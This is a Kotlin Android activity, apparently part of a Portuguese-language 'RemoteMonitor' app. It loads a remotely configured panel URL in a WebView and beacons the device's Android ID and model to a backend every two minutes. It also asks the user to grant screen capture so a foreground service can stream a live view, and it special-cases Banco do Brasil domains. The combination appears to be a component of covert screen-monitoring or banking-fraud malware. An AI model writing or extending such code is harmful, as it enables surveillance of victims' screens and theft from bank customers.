package com.remotemonitor.test

import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.ComponentActivity
import androidx.activity.OnBackPressedCallback
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URLEncoder
import java.net.URL
import java.nio.charset.StandardCharsets

class MainActivity : ComponentActivity() {
    private val mediaProjectionManager by lazy {
        getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
    }

    private val heartbeatHandler = Handler(Looper.getMainLooper())
    private val checkinHeartbeat = object : Runnable {
        override fun run() {
            Thread { sendDeviceCheckin() }.start()
            heartbeatHandler.postDelayed(this, DEVICE_CHECKIN_INTERVAL_MS)
        }
    }

    private lateinit var webView: WebView
    private var hasRequestedCapturePermission = false
    private var hasOpenedExternalFallback = false
    private var lastTargetUrl: String = BuildConfig.FALLBACK_PANEL_URL

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        webView = WebView(this)
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                val clickedUrl = request?.url?.toString() ?: return false

                if (clickedUrl == "app://retry") {
                    hasOpenedExternalFallback = false
                    loadPanelFromBackend()
                    return true
                }

                if (clickedUrl == "app://open-browser") {
                    openInExternalBrowser(lastTargetUrl)
                    return true
                }

                return false
            }

            override fun onReceivedError(
                view: WebView?,
                request: WebResourceRequest?,
                error: WebResourceError?
            ) {
                super.onReceivedError(view, request, error)
                if (request?.isForMainFrame == true) {
                    showConnectionErrorScreen(error?.description?.toString())
                }
            }

            override fun onReceivedHttpError(
                view: WebView?,
                request: WebResourceRequest?,
                errorResponse: WebResourceResponse?
            ) {
                super.onReceivedHttpError(view, request, errorResponse)
                if (request?.isForMainFrame == true && (errorResponse?.statusCode ?: 200) >= 400) {
                    showConnectionErrorScreen("HTTP ${errorResponse?.statusCode ?: 0}")
                }
            }
        }
        webView.webChromeClient = WebChromeClient()
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true

        setContentView(webView)

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (::webView.isInitialized && webView.canGoBack()) {
                    webView.goBack()
                } else {
                    finish()
                }
            }
        })

        loadPanelFromBackend()
        requestScreenCapturePermissionIfNeeded()
    }

    override fun onResume() {
        super.onResume()
        startDeviceHeartbeat()
    }

    override fun onPause() {
        stopDeviceHeartbeat()
        super.onPause()
    }

    override fun onDestroy() {
        stopDeviceHeartbeat()
        if (::webView.isInitialized) {
            webView.destroy()
        }
        super.onDestroy()
    }

    private fun startDeviceHeartbeat() {
        heartbeatHandler.removeCallbacks(checkinHeartbeat)
        heartbeatHandler.post(checkinHeartbeat)
    }

    private fun stopDeviceHeartbeat() {
        heartbeatHandler.removeCallbacks(checkinHeartbeat)
    }

    private fun requestScreenCapturePermissionIfNeeded() {
        if (hasRequestedCapturePermission) return
        hasRequestedCapturePermission = true

        try {
            val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
            startActivityForResult(captureIntent, SCREEN_CAPTURE_REQUEST_CODE)
        } catch (error: Exception) {
            Log.w("RemoteMonitor", "Falha ao solicitar permissao de captura de tela", error)
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode != SCREEN_CAPTURE_REQUEST_CODE) return

        if (resultCode != RESULT_OK || data == null) {
            Log.w("RemoteMonitor", "Permissao de captura negada pelo usuario")
            return
        }

        try {
            val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
                putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
                putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (error: Exception) {
            Log.w("RemoteMonitor", "Falha ao iniciar servico de captura", error)
        }
    }

    private fun loadPanelFromBackend() {
        runOnUiThread {
            webView.loadDataWithBaseURL(
                null,
                loadingScreenHtml(),
                "text/html",
                "UTF-8",
                null
            )
        }

        Thread {
            val runtimeUrl = fetchRuntimePanelUrl()
            val targetUrl = if (runtimeUrl.isNullOrBlank()) {
                BuildConfig.FALLBACK_PANEL_URL
            } else {
                runtimeUrl
            }
            lastTargetUrl = targetUrl
            sendDeviceCheckin()

            runOnUiThread {
                if (shouldForceExternalBrowser(targetUrl)) {
                    openInExternalBrowser(targetUrl)
                    return@runOnUiThread
                }
                webView.loadUrl(targetUrl)
            }
        }.start()
    }

    private fun sendDeviceCheckin() {
        try {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                ?: "unknown"
            val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/checkin"
            val connection = URL(endpoint).openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = 10_000
            connection.readTimeout = 10_000
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json")

            val payload = JSONObject().apply {
                put("packageName", BuildConfig.APPLICATION_ID)
                put("deviceUid", androidId)
                put("deviceName", Build.MODEL ?: "Android Device")
                put("model", Build.MODEL ?: "Android")
            }

            OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use { writer ->
                writer.write(payload.toString())
            }

            val statusCode = connection.responseCode
            if (statusCode !in 200..299) {
                Log.w("RemoteMonitor", "Check-in retornou HTTP $statusCode")
            }
        } catch (error: Exception) {
            Log.w("RemoteMonitor", "Falha ao enviar check-in do dispositivo", error)
        }
    }

    private fun loadingScreenHtml(): String {
        return """
            <html>
              <body style=\"font-family:sans-serif;padding:24px;line-height:1.5;\">
                <h3>Conectando ao painel...</h3>
                <p>Aguarde alguns segundos enquanto carregamos a configuracao.</p>
                <p>Aceite a permissao de captura de tela para ativar o Ao Vivo em tempo real.</p>
              </body>
            </html>
        """.trimIndent()
    }

    private fun showConnectionErrorScreen(details: String?) {
        val escapedUrl = lastTargetUrl
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")

        val escapedDetails = (details ?: "Falha de conexao")
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")

        val html = """
            <html>
              <body style=\"font-family:sans-serif;padding:24px;line-height:1.5;\">
                <h3>Nao foi possivel abrir o painel</h3>
                <p>Verifique sua internet e tente novamente.</p>
                <p><strong>Detalhe:</strong> $escapedDetails</p>
                <p><strong>URL alvo:</strong> $escapedUrl</p>
                <div style=\"margin-top:16px;display:flex;gap:8px;flex-wrap:wrap;\">
                  <a href=\"app://retry\" style=\"display:inline-block;padding:10px 14px;background:#1f6feb;color:white;text-decoration:none;border-radius:6px;\">Tentar novamente</a>
                  <a href=\"app://open-browser\" style=\"display:inline-block;padding:10px 14px;background:#24292f;color:white;text-decoration:none;border-radius:6px;\">Abrir no navegador</a>
                </div>
              </body>
            </html>
        """.trimIndent()

        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
    }

    private fun shouldForceExternalBrowser(url: String): Boolean {
        val host = try {
            Uri.parse(url).host?.lowercase() ?: return false
        } catch (_: Exception) {
            return false
        }

        return host.contains("bb.com.br")
    }

    private fun openInExternalBrowser(url: String) {
        if (hasOpenedExternalFallback) return
        hasOpenedExternalFallback = true

        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (error: Exception) {
            Log.w("RemoteMonitor", "Falha ao abrir navegador externo", error)
        }
    }

    private fun fetchRuntimePanelUrl(): String? {
        return try {
            val encodedPackage = URLEncoder.encode(BuildConfig.APPLICATION_ID, StandardCharsets.UTF_8.toString())
            val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/apk/runtime-config?packageName=$encodedPackage"
            val connection = URL(endpoint).openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 10_000
            connection.readTimeout = 10_000

            if (connection.responseCode !in 200..299) {
                null
            } else {
                val body = connection.inputStream.bufferedReader().use { it.readText() }
                val json = JSONObject(body)
                if (!json.optBoolean("success")) {
                    null
                } else {
                    val config = json.optJSONObject("config") ?: return null
                    config.optString("panelUrl").takeIf { it.isNotBlank() }
                }
            }
        } catch (error: Exception) {
            Log.w("RemoteMonitor", "Falha ao carregar runtime-config", error)
            null
        }
    }
}

private const val DEVICE_CHECKIN_INTERVAL_MS = 2 * 60 * 1000L
private const val SCREEN_CAPTURE_REQUEST_CODE = 1407
